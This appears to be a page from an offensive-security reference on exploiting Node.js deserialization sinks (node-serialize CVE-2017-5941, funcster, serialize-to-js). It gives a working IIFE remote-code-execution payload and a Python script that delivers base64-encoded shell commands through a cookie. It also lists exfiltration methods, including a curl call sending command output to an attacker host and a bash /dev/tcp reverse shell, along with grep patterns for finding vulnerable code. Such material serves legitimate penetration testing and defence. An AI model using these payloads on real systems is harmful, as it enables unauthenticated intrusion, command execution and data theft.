# Node.js Deserialization (`node-serialize` CVE-2017-5941, `funcster`, `serialize-to-js`)

## When this applies

- Source uses `node-serialize` (`require('node-serialize')`), `funcster`, or `serialize-to-js`, and calls `unserialize()` / `deserialize()` on **user-controlled input** (cookies, POST body, headers, query string).
- A common gateway pattern is a session/auth helper:
  ```js
  function authenticated(c) {
      if (typeof c == 'undefined') return false
      c = serialize.unserialize(c)
      ...
  }
  app.get('/', (req, res) => { authenticated(req.cookies.auth) })
  ```
  Every request with a cookie of that name fires `unserialize()`. No login required.
- Goal: arbitrary RCE as the Node process user via the `_$$ND_FUNC$$_` IIFE smuggling primitive (CVE-2017-5941).

## Why it works

`node-serialize.unserialize(s)` does (roughly):

```js
if (typeof s === 'string') s = JSON.parse(s)
walk(s, (v) => {
    if (typeof v === 'string' && v.startsWith('_$$ND_FUNC$$_')) {
        return eval('(' + v.slice('_$$ND_FUNC$$_'.length) + ')')
    }
})
```

The `eval` of a function expression is just a function — but if the smuggled string is an **IIFE** (function expression immediately followed by `()`), `eval` invokes it and the body runs inside `unserialize`.

## Canonical payload

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/out')}()"}
```

Delivered as `Cookie: auth=<URL-encoded JSON>` (or POST body / header — wherever the sink reads from).

## ⚠ JSON-quote discipline (the silent-fail trap)

The outer envelope is JSON, parsed first. Any unescaped `"` inside the JS body breaks `JSON.parse` and the whole request silently fails (no `_$$ND_FUNC$$_` walk ever happens).

| Form | Result |
|---|---|
| `function(){require("child_process")...}` (double quotes) | `JSON.parse` fails → no RCE, no error visible to attacker |
| `function(){require('child_process')...}` (single quotes) | Valid JSON → eval fires → RCE |

**Use single quotes inside the JS body.** If the command itself needs single quotes, base64-encode it and decode at runtime: `eval(Buffer.from('<b64>','base64').toString())`.

## Reliable delivery recipe (Python)

```python
import http.client, urllib.parse, base64

def rce_via_node_serialize(host, port, path, cookie_name, shell_cmd):
    # Base64 the actual shell command so it never has to escape inside the JSON
    b64 = base64.b64encode(shell_cmd.encode()).decode()
    js  = "function(){require('child_process').exec('echo " + b64 + " | base64 -d | bash')}()"
    payload = '{"rce":"_$$ND_FUNC$$_' + js + '"}'
    enc = urllib.parse.quote(payload, safe='')
    conn = http.client.HTTPConnection(host, port, timeout=15)
    conn.request("GET", path, headers={"Cookie": f"{cookie_name}={enc}"})
    return conn.getresponse().status

# Trigger sleep — confirms execution before going noisier
rce_via_node_serialize("<TARGET>", 5000, "/", "auth",
                      "sleep 7")
```

## Output exfiltration when there's no stdout

`exec()` discards stdout — the HTTP response is unchanged. Three options:

1. **Out-of-band**: `curl http://<ATTACKER>/?$(id|base64 -w0)` or DNS exfil via `nslookup`.
2. **/tmp + secondary read primitive**: write to `/tmp/<file>`, `chmod 644`, then read it back via a separate XXE / file-read / static-file primitive on the same host. Useful when the box has no outbound network.
3. **Reverse shell**: `bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1` — only if egress is allowed.

## Source-code fingerprints (grep these first)

```bash
grep -RIn --include='*.js' \
  -e "require('node-serialize')" \
  -e "require(\"node-serialize\")" \
  -e "require('funcster')" \
  -e "require('serialize-to-js')" \
  -e "\.unserialize(" \
  -e "\.deserialize(" \
  -e "_\$\$ND_FUNC\$\$_"
```

If any match reads from `req.cookies`, `req.body`, `req.headers`, `req.query`, or any framework-equivalent, you have an unauth RCE primitive — every request with the relevant input runs the eval.

## Variants

| Library | Sink | Smuggling marker |
|---|---|---|
| `node-serialize` (any version with `eval` walker) | `unserialize(string)` | `_$$ND_FUNC$$_function(){...}()` |
| `funcster` ≤ 0.0.1 | `deepDeserialize(o)` | `__js_function: "function(){...}()"` (object form, not string) |
| `serialize-to-js` ≤ 0.5.0 | `deserialize(string)` | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` (same shape) |
| `cryo` ≤ 0.0.6 | `parse(string)` | crafted-prototype gadget — different shape, not IIFE |

## Common pitfalls (anti-patterns)

- Forgetting the trailing `()` — the IIFE call. Without it, `eval` returns the function but never calls it; nothing executes.
- Escaped double quotes (`\"`) inside the JS body — JSON.parse fails silently; you get a 200 OK with normal page output and conclude "doesn't work."
- Sending raw JSON in the cookie header without URL-encoding — `;` and `,` and `=` and space terminate the cookie value at the HTTP layer.
- Targeting an endpoint that doesn't trigger the deserialize sink. Re-read the source: the sink fires on `req.cookies.<NAME>`, but only if the route actually inspects that cookie. `app.get('/')` typically does (auth helper); a static asset route may not.

## Cross-references

- Source-code grep patterns for deserialization sinks: [../../../../source-code-scanning/reference/language-patterns.md](../../../../source-code-scanning/reference/language-patterns.md)
- XXE as a paired read-primitive for output exfil: [../../../../injection/reference/xxe-quickstart.md](../../../../injection/reference/xxe-quickstart.md)
- Sibling deserialization scenarios: [`php-deserialization.md`](php-deserialization.md), [`java-deserialization.md`](java-deserialization.md), [`python-and-ruby.md`](python-and-ruby.md), [`dotnet-deserialization.md`](dotnet-deserialization.md)
